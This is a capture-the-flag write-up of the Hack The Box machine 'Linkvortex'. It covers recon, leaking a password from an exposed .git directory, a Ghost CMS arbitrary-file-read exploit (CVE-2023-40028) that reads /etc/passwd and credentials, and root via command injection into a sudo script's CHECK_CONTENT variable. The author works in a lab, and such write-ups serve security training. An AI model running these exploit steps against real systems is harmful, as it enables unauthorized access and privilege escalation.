# Linkvortex

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.47:22
Open 10.10.11.47:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.47

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

![Writeup.png](/assets/pentest/htb/linkvortex/Writeup.png)

Ghost CMS is odd to enumerate as everything redirects and it's hell; 
```bash
└─$ feroxbuster -u 'http://linkvortex.htb/' -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -n -D -C 404,403,400 -S 0,34
200      GET        1l       27w     6743c http://linkvortex.htb/public/cards.min.js
200      GET        2l      157w    10332c http://linkvortex.htb/assets/built/casper.js
200      GET        1l      583w    35739c http://linkvortex.htb/public/cards.min.css
200      GET        2l       46w    25518c http://linkvortex.htb/favicon.ico
200      GET        2l      769w    39700c http://linkvortex.htb/assets/built/screen.css
200      GET      307l      914w    12148c http://linkvortex.htb/
200      GET       22l      167w     1065c http://linkvortex.htb/LICENSE
301      GET       10l       16w      179c http://linkvortex.htb/assets => http://linkvortex.htb/assets/
200      GET        6l       12w      121c http://linkvortex.htb/robots.txt
200      GET        1l        6w      527c http://linkvortex.htb/sitemap.xml
```

I quickly gave up on main domain because it seems like a blog and that's all, we have `admin` username only.

Enumerate subdomains
```bash
└─$ domain='linkvortex.htb'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fl 8
dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 85ms]
#www                    [Status: 400, Size: 226, Words: 20, Lines: 9, Duration: 72ms]
#mail                   [Status: 400, Size: 226, Words: 20, Lines: 9, Duration: 72ms]
:: Progress: [19966/19966] :: Job [1/1] :: 522 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

![Writeup-1.png](/assets/pentest/htb/linkvortex/Writeup-1.png)

```bash
└─$ feroxbuster -u 'http://dev.linkvortex.htb/' -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -n -D -C 404,403,400 -S 0,34
200      GET      115l      255w     2538c http://dev.linkvortex.htb/
200      GET        1l        1w       41c http://dev.linkvortex.htb/.git/HEAD
200      GET        8l       21w      201c http://dev.linkvortex.htb/.git/config
200      GET        1l        9w      175c http://dev.linkvortex.htb/.git/logs/HEAD
301      GET        7l       20w      239c http://dev.linkvortex.htb/.git => http://dev.linkvortex.htb/.git/
200      GET       15l       53w      868c http://dev.linkvortex.htb/.git/logs/
200      GET     2172l     8158w   958396c http://dev.linkvortex.htb/.git/index
200      GET      115l      255w     2538c http://dev.linkvortex.htb/index.html
[####################] - 12s     7330/7330    0s      found:8       errors:0
[####################] - 12s     7276/7276    627/s   http://dev.linkvortex.htb/ 
```

```bash
└─$ git-dumper http://dev.linkvortex.htb/.git dev
```

After some code review I noticed that `ghost` was purple, indicating staged changes but not yet committed

![Writeup-2.png](/assets/pentest/htb/linkvortex/Writeup-2.png)

> Password: `OctopiFociPilfer45`

Login URL: [http://linkvortex.htb/ghost/#/signin/](http://linkvortex.htb/ghost/#/signin/)

> Creds: `admin@linkvortex.htb:OctopiFociPilfer45`

Version of Ghost CMS is 5.58
```bash
└─$ curl -s http://linkvortex.htb/ | grep Ghost
    <meta name="generator" content="Ghost 5.58">
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
```

It's also found from these sources (?)

![Writeup-3.png](/assets/pentest/htb/linkvortex/Writeup-3.png)

[Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)

```bash
└─$ git clone -q https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git

└─$ bash ./Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /proc/self/environ
File content:
Enter the file path to read (or type 'exit' to quit): /proc/self/cmdline
File content:
Enter the file path to read (or type 'exit' to quit): /etc/passwd
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

We are inside docker, if file doesn't exist it errors and no errors means file exists.
```bash
Enter the file path to read (or type 'exit' to quit): /.dockerenv
File content:
```

Get production configuration
```json
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

## SSH (22)

```bash
└─$ sshpass -p 'fibber-talented-worth' ssh bob@linkvortex.htb
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

### User.txt

```
bob@linkvortex:~$ cat user.txt
6784750b5297833385af58cb61b5c57b
```

## Privilege Escalation

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

```bash
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

```bash
bob@linkvortex:/dev/shm$ ln -s /usr/share/gitweb/static/git-favicon.png git-favicon.png
bob@linkvortex:/dev/shm$ sudo CHECK_CONTENT="install -m4777 /bin/bash /tmp/rootbash" /usr/bin/bash /opt/ghost/clean_symlink.sh git-favicon.png
/opt/ghost/clean_symlink.sh: line 5: [: syntax error: `-m4777' unexpected
Link found [ git-favicon.png ] , moving it to quarantine'
Content:
PNG

IHDRb   PLTE%IDAcX
                  ؈[2+ajjdsQ#[ovIENDB`
bob@linkvortex:/dev/shm$ ls /tmp/rootbash -lh
-rwsrwxrwx 1 root root 1.4M Jan 12 09:22 /tmp/rootbash
bob@linkvortex:/dev/shm$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(bob) gid=1001(bob) euid=0(root) groups=1001(bob)
```

### Root.txt

```
rootbash-5.1# rm /tmp/rootbash # Public box
rootbash-5.1# cat /root/root.txt
502aa72811a1f728d8d6924a42b629b3
```